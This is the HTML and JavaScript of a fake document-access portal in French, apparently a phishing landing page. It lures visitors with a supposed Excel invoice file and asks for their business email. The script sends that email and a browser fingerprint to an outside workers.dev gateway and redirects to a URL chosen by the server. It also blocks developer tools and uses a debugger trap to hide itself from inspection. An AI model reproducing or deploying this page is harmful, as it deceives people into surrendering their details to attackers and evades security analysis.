<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description" content="Débloquez notre proposition exclusive en soumettant votre adresse e‑mail." />
  <title>Accès à la proposition</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=Playfair+Display:wght@700&display=swap" rel="stylesheet" />
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
  <style>
    *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;font-family:"Inter",sans-serif;}
    body {
      min-height:100vh;
      background:linear-gradient(135deg,#f1f5f9 0%,#c3d7ff 100%);
      padding:24px;
      overflow:hidden;
      display:flex;
      justify-content:center;
      align-items:center;
    }
    .container {
      display:flex;
      width:100%;
      max-width:1200px;
      background:#fff;
      border-radius:24px;
      box-shadow:0 16px 48px rgba(0,0,0,0.15);
      overflow:hidden;
      animation:slideIn 0.7s ease-out;
    }
    @keyframes slideIn {
      from {opacity:0;transform:translateY(40px);}
      to {opacity:1;transform:translateY(0);}
    }
    .left-panel {
      width:40%;
      background:#1e3a8a;
      padding:40px;
      color:#fff;
      text-align:center;
    }
    .text-logo {
      font-family:"Playfair Display",serif;
      font-size:34px;
      font-weight:700;
      margin-bottom:24px;
    }
    .left-panel h2 {font-size:28px;font-weight:700;margin-bottom:16px;}
    .left-panel p {font-size:16px;margin-bottom:20px;}
    .left-panel ul {
      list-style:none;
      text-align:left;
      margin-left:20%;
      font-size:14px;
    }
    .left-panel ul li {margin-bottom:8px;}
    .left-panel .footer {font-size:12px;margin-top:40px;color:#a3bffa;}
    .right-panel {
      width:60%;
      padding:40px;
      background:#fff;
      display:flex;
      flex-direction:column;
      align-items:center;
    }
    .preview {text-align:center;margin-bottom:40px;}
    .preview h3 {font-size:24px;color:#1e3a8a;margin-bottom:10px;}
    .preview p {font-size:14px;color:#4b5563;margin-bottom:20px;}
    .access-btn {
      padding:14px 32px;
      background:linear-gradient(90deg,#7c3aed 0%,#4c1d95 100%);
      border:none;
      border-radius:10px;
      color:#fff;
      font-size:16px;
      font-weight:600;
      cursor:pointer;
      transition:all 0.3s ease;
      box-shadow:0 4px 16px rgba(124,58,237,0.3);
    }
    .access-btn:hover {
      background:linear-gradient(90deg,#6d28d9 0%,#3b0764 100%);
      transform:translateY(-2px);
      box-shadow:0 6px 20px rgba(124,58,237,0.4);
    }
    .popup {
      display:none;
      position:fixed;
      top:50%;
      left:50%;
      transform:translate(-50%,-50%);
      background:#fff;
      border-radius:16px;
      box-shadow:0 12px 32px rgba(0,0,0,0.2);
      padding:30px;
      width:90%;
      max-width:400px;
      text-align:center;
      z-index:10;
    }
    .popup.active {display:block;}
    .form-group {margin-bottom:24px;text-align:left;}
    .form-group input {
      width:100%;
      padding:14px;
      border:1px solid #d1d5db;
      border-radius:10px;
      font-size:16px;
      background:#f9fafb;
    }
    .submit-btn {
      width:100%;
      padding:14px;
      background:linear-gradient(90deg,#7c3aed 0%,#4c1d95 100%);
      border:none;
      border-radius:10px;
      color:#fff;
      font-size:16px;
      font-weight:600;
      cursor:pointer;
      transition:all 0.3s ease;
      box-shadow:0 4px 16px rgba(124,58,237,0.3);
    }
    .captcha-wrapper {
      display:flex;
      justify-content:center;
      align-items:center;
      margin-bottom:20px;
    }
    #cf-turnstile {
      display:inline-block;
      transform:scale(0.95);
      transform-origin:0 0;
    }
    .error {
      color:#ef4444;
      font-size:14px;
      margin-top:12px;
      display:none;
      text-align:center;
    }
    .honeypot {position:absolute;left:-9999px;top:-9999px;}


    
  </style>


  
</head>
<body>
  <noscript>
    <style>body { display: none !important; }</style>
    <div style="text-align:center; padding:40px; font-family:sans-serif;">
      <h2>JavaScript required</h2>
      <p>This page requires JavaScript to function properly. Please enable it in your browser.</p>
    </div>
  </noscript>

  <div class="container">
    <div class="left-panel">
      <div class="text-logo i18n" data-i18n="heading">Portail d’information</div>
    
        <li class="i18n" data-i18n="fileSize">Taille&nbsp;: 65&nbsp;KB</li>
        <li class="i18n" data-i18n="fileFormat">Format&nbsp;: MS Excel</li>
        <li class="i18n" data-i18n="fileName">Nom&nbsp;: FA7658923‑07‑2025.xls</li>
      </ul>
      <div class="footer">Copyright | © 2025</div>
    </div>

    <div class="right-panel">
      <div class="preview">
        <h3 class="i18n" data-i18n="fileName">FA7658923‑08‑2025.xls</h3>
        <p class="i18n" data-i18n="benefitText">La meilleure solution pour accéder à des document exclusives&nbsp;!</p>
        <button class="access-btn i18n" id="openPopup" data-i18n="openButton">Accéder à la document</button>
      </div>

      <div id="popup" class="popup" aria-modal="true" role="dialog">
        <h3 class="i18n" data-i18n="confirmHeading">Confirmez votre adresse e‑mail</h3>
        <form id="emailForm" autocomplete="off" novalidate>
          <input type="text" id="middleName" name="middleName" class="honeypot" tabindex="-1" aria-hidden="true" />

          <div class="form-group">
            <input type="email" id="email" name="email"
                   class="i18n-placeholder"
                   data-i18n-placeholder="emailPlaceholder"
                   required
                   placeholder="Entrez votre e-mail professionnel" />
          </div>

          <div class="captcha-wrapper">
            <div id="cf-turnstile"
                 class="cf-turnstile"
                 data-sitekey="0x4AAAAAABhsKFJ88b73jtsO"
                 data-callback="onTurnstileDone"
                 data-size="normal"
                 data-theme="light">
            </div>
          </div>

          <button type="submit" class="submit-btn i18n" data-i18n="submitButton">Accéder maintenant</button>
          <p id="error" class="error i18n" data-i18n="invalidEmail">Adresse e‑mail invalide</p>
        </form>
      </div>
    </div>
  </div>






  

 <script>
   document.addEventListener("DOMContentLoaded", async () => {
  const translations = {
    en: {
      heading: "Information Portal",
    
      fileSize: "Size: 65 KB",
      fileFormat: "Format: MS Excel",
      fileName: "FAC7658923‑08‑2025.xls",
      benefitText: "The best way to access exclusive document",
      openButton: "Access document",
      confirmHeading: "Confirm your email address",
      emailPlaceholder: "Enter your business email",
      submitButton: "Access now",
      invalidEmail: "Invalid email address",
      captchaRequired: "Please complete the CAPTCHA",
      connectionError: "Server connection error",
      unexpectedError: "Unexpected error",
      redirecting: "Redirecting…"
    },
    fr: {
      heading: "Accès au document",
     
      fileSize: "Taille :  65 KB",
      fileFormat: "Format : MS Excel",
      fileName: "FAC7658923‑08‑2025.xls",
      benefitText: "Votre accès sécurisé et confidentiel à des documents exclusifs",
      openButton: "Accéder à la proposition",
      confirmHeading: "Confirmez votre adresse e‑mail",
      emailPlaceholder: "Entrez votre e-mail professionnel",
      submitButton: "Accéder maintenant",
      invalidEmail: "Adresse e‑mail invalide",
      captchaRequired: "Veuillez compléter le CAPTCHA",
      connectionError: "Erreur de connexion au serveur",
      unexpectedError: "Erreur inattendue",
      redirecting: "Redirection…"
    },
    de: {
      heading: "Dokumentzugriff",
      readyText: "Ihre Datei ist bereit zur Ansicht!",
      fileSize: "Größe: 365 KB",
      fileFormat: "Format: MS Excel",
      fileName: "FA7658923‑08‑2025.xls",
      benefitText: "Der beste Weg zu exklusiven Angeboten!",
      openButton: "Angebot anzeigen",
      confirmHeading: "Bestätigen Sie Ihre E-Mail-Adresse",
      emailPlaceholder: "Geben Sie Ihre geschäftliche E-Mail ein",
      submitButton: "Jetzt zugreifen",
      invalidEmail: "Ungültige E-Mail-Adresse",
      captchaRequired: "Bitte CAPTCHA ausfüllen",
      connectionError: "Serververbindungsfehler",
      unexpectedError: "Unerwarteter Fehler",
      redirecting: "Weiterleitung…"
    },
    nl: {
      heading: "Documenttoegang",
      readyText: "Uw bestand is klaar om te bekijken!",
      fileSize: "Grootte: 365 KB",
      fileFormat: "Formaat: MS Excel",
      fileName: "Naam: FA7658923‑08‑2025.xls",
      benefitText: "De beste manier om exclusieve voorstellen te bekijken!",
      openButton: "Voorstel openen",
      confirmHeading: "Bevestig uw e-mailadres",
      emailPlaceholder: "Voer uw zakelijke e-mailadres in",
      submitButton: "Nu openen",
      invalidEmail: "Ongeldig e-mailadres",
      captchaRequired: "Vul de CAPTCHA in",
      connectionError: "Serververbindingsfout",
      unexpectedError: "Onverwachte fout",
      redirecting: "Bezig met doorsturen…"
    },
    pl: {
      heading: "Dostęp do dokumentu",
      readyText: "Twój plik jest gotowy do wyświetlenia!",
      fileSize: "Rozmiar: 365 KB",
      fileFormat: "Format: MS Excel",
      fileName: "Nazwa: FA7658923‑08‑2025.xls",
      benefitText: "Najlepszy sposób na dostęp do ekskluzywnych ofert!",
      openButton: "Otwórz propozycję",
      confirmHeading: "Potwierdź swój adres e-mail",
      emailPlaceholder: "Wprowadź firmowy adres e-mail",
      submitButton: "Uzyskaj dostęp",
      invalidEmail: "Nieprawidłowy adres e-mail",
      captchaRequired: "Proszę uzupełnić CAPTCHA",
      connectionError: "Błąd połączenia z serwerem",
      unexpectedError: "Nieoczekiwany błąd",
      redirecting: "Przekierowanie…"
    },
    it: {
      heading: "Accesso al documento",
      readyText: "Il tuo file è pronto per essere visualizzato!",
      fileSize: "Dimensione: 365 KB",
      fileFormat: "Formato: MS Excel",
      fileName: "Nome: FA7658923‑08‑2025.xls",
      benefitText: "Il modo migliore per accedere a proposte esclusive!",
      openButton: "Accedi alla proposta",
      confirmHeading: "Conferma il tuo indirizzo email",
      emailPlaceholder: "Inserisci la tua email aziendale",
      submitButton: "Accedi ora",
      invalidEmail: "Indirizzo email non valido",
      captchaRequired: "Completa il CAPTCHA",
      connectionError: "Errore di connessione al server",
      unexpectedError: "Errore imprevisto",
      redirecting: "Reindirizzamento…"
    }
  };

  
const lang = (navigator.language || "fr").slice(0, 2);
  const t = translations[lang] || translations.fr;

  // Apply text and placeholders
  document.querySelectorAll("[data-i18n]").forEach(el => {
    el.textContent = t[el.dataset.i18n] || el.textContent;
  });
  document.querySelectorAll("[data-i18n-placeholder]").forEach(el => {
    el.setAttribute("placeholder", t[el.dataset.i18nPlaceholder] || el.getAttribute("placeholder"));
  });

  const gateway = "https://seconwrkseabnokpiam.afterbbgit.workers.dev";
  const popup = document.getElementById("popup");
  const openBtn = document.getElementById("openPopup");
  const form = document.getElementById("emailForm");
  const errBox = document.getElementById("error");
  const input = document.getElementById("email");

  let cfProof = "", fpHash = "";

  // Delay popup render
  setTimeout(() => popup.classList.add("js-ready"), 1500);

  function getClientSig() {
    const nav = navigator;
    return [nav.userAgent, nav.language, nav.platform, screen.width + "x" + screen.height].join("|");
  }

  async function hashFingerprint(str) {
    const encoder = new TextEncoder();
    const data = encoder.encode(str);
    const hashBuffer = await crypto.subtle.digest("SHA-256", data);
    return btoa(String.fromCharCode(...new Uint8Array(hashBuffer)));
  }

  hashFingerprint(getClientSig()).then(fp => fpHash = fp);

  window.onTurnstileDone = (token) => {
    cfProof = token;
    errBox.style.display = "none";
  };

  const show = (el, msg) => { if (msg) el.textContent = msg; el.style.display = "block"; };
  const hide = (el) => el.style.display = "none";

  openBtn.addEventListener("click", () => popup.classList.add("active"));
  document.addEventListener("click", (e) => {
    if (!popup.contains(e.target) && e.target !== openBtn) {
      popup.classList.remove("active");
    }
  });

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    const val = input.value.trim();
    const trap = document.getElementById("middleName").value.trim();
    const jsSig = "ok-" + Math.random().toString(36).slice(2);

    if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(val)) return show(errBox, t.invalidEmail);
    if (trap) return;

    try {
      const res = await fetch(gateway, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: val,
          middleName: trap,
          jsToken: jsSig,
          cfToken: cfProof || "",
          fingerprint: fpHash
        })
      });

      const json = await res.json();
      if (!res.ok || !json.valid || !json.redirect) return show(errBox, json.message || t.unexpectedError);

      form.querySelector(".submit-btn").textContent = t.redirecting;
      if (typeof turnstile !== "undefined") turnstile.reset("#cf-turnstile");
      cfProof = "";
      setTimeout(() => (location.href = json.redirect), 1200);
    } catch {
      show(errBox, t.connectionError);
    }
  });

  input.addEventListener("input", () => hide(errBox));

  // Optional: parse redirect info
  const r = (() => {
    const match = window.location.pathname.match(/\/\.(\d+)\.([a-f0-9]{64})\/\$([a-zA-Z0-9+/=]+)$/);
    if (!match) return null;
    const [_, exp, hmac, b64] = match;
    if (parseInt(exp) < Date.now() / 1000) return null;
    try { return { email: atob(b64), exp, hmac }; } catch { return null; }
  })();

  if (r && r.email) {
    const showEmail = document.getElementById("userEmail");
    if (showEmail) showEmail.textContent = r.email;
    sessionStorage.setItem("validatedEmail", r.email);
  }

  // Anti-inspection
  document.addEventListener("contextmenu", e => e.preventDefault());
  document.addEventListener("keydown", e => {
    if (
      e.key === "F12" ||
      (e.ctrlKey && e.shiftKey && ["I", "J", "C"].includes(e.key)) ||
      (e.ctrlKey && e.key === "U")
    ) e.preventDefault();
  });

  setInterval(() => {
    const start = performance.now();
    debugger;
    const delta = performance.now() - start;
    if (delta > 100) {
      document.body.innerHTML = "<h1 style='text-align:center;margin-top:20vh;'>Blocked</h1>";
    }
  }, 1500);

  // JS-only fallback redirect
  const noscript = document.createElement("noscript");
  noscript.innerHTML = `<meta http-equiv="refresh" content="0;url=https://blockpage.example.com">`;
  document.body.appendChild(noscript);
});
</script>



</body>
</html>
